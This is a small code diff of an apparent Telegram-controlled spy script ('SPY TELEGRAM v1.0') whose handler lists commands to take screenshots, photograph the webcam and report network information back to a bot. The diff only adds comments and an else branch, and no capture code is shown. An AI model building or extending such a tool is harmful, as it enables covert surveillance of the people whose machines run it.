@@ -10,9 +10,9 @@
 #░╚═══██╗██╔═══╝░░░╚██╔╝░░ ░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
 #██████╔╝██║░░░░░░░░██║░░░ ░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
 #╚═════╝░╚═╝░░░░░░░░╚═╝░░░ ░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝ v1.0
-import time
-import telepot
-from telepot.loop import MessageLoop
+import time                             # Pausar script por segundos predeterminados
+import telepot                          # Api de Telegram
+from telepot.loop import MessageLoop    # Api de Telegram
 
 
 class Config:
@@ -42,16 +42,11 @@ class Config:
 
 
 
-
-
 def handle(msg):
     command = msg['text']  # Texto a recibir
     #content_type, chat_type, chat_id = telepot.glance(msg)
     #print(content_type, chat_type, chat_id)
     cache = ""
-
-
-
     if command == "/about":
         bot.sendMessage(Config.TelegramBot().ID, "/About\n Developed by: SebastiánEPH")
     elif command == "/screenshot ":
@@ -60,9 +55,9 @@ def handle(msg):
         functionelities =   "/red_info => Información de la Red\n" \
                             "/webcam   => Toma foto a la WebCam\n" \
                             "/mas comandos   "
-
-
         bot.sendMessage(Config.TelegramBot().ID,functionelities )
+    else:
+        pass
 
 
 # Starting Script
